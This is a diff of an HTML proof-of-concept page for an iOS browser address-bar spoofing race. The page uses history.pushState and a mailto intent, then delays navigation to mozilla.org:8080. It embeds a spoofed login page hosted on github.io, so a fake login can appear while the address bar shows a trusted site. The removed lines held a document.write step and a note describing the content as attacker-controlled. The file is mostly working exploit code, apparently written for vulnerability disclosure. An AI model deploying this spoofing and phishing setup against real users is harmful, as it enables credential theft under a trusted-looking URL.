@@ -3,65 +3,47 @@
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>iOS External Intent Navigation State PoC</title>
-
   <style>
     body {
       font-family: system-ui, sans-serif;
-    }
-    .note {
-      color: red;
-      font-weight: bold;
-      margin-top: 20px;
     }
     iframe {
       width: 100%;
       height: 420px;
       border: 1px solid #ccc;
-      margin-top: 10px;
+      margin-top: 20px;
     }
   </style>
 </head>
-
 <body>
 
-  <button id="test">Trigger mailto intentA</button>
+<button id="test">Trigger mailto intent</button>
 
-  <script>
-    document.getElementById('test').onclick = () => {
+<!-- iframe langsung ada -->
+<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
 
-      // Step 1: Change visible URL without navigation
-      history.pushState({}, '', '/expected-path');
+<script>
+document.getElementById('test').onclick = () => {
 
-      // Step 2: Trigger external intent (Mail app)
-      setTimeout(() => {
-        location.href = 'mailto:tap again to mozila';
-      }, 300);
+  // Step 1: change visible URL
+  history.pushState({}, '', '/expected-path');
 
-      // Step 3: Delayed navigation that updates the address bar
-      setTimeout(() => {
-        location.href = 'https://www.mozilla.org:8080';
-      }, 1200);
+  // Step 2: trigger external intent
+  setTimeout(() => {
+    location.href = 'mailto:tap again to mozila';
+  }, 300);
 
-      // Step 4: RACE — attempt to replace document content with iframe
-      setTimeout(() => {
-        try {
-          document.open();
-          document.write(`
-            <p class="note">
-              Demo: Address bar shows mozilla.org, but content below is attacker-controlled.
-            </p>
-            <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
-          `);
-          document.close();
-        } catch (e) {}
-      }, 1250);
-    };
-  </script>
+  // Step 3: delayed navigation after intent
+  setTimeout(() => {
+    location.href = 'https://www.mozilla.org:8080';
+  }, 1200);
+};
+</script>
 
-  <p>
-    Observe whether the address bar always reflects the active document
-    after returning from the mail app.
-  </p>
+<p>
+Observe whether the address bar always reflects the active document
+after returning from the mail app.
+</p>
 
 </body>
 </html>
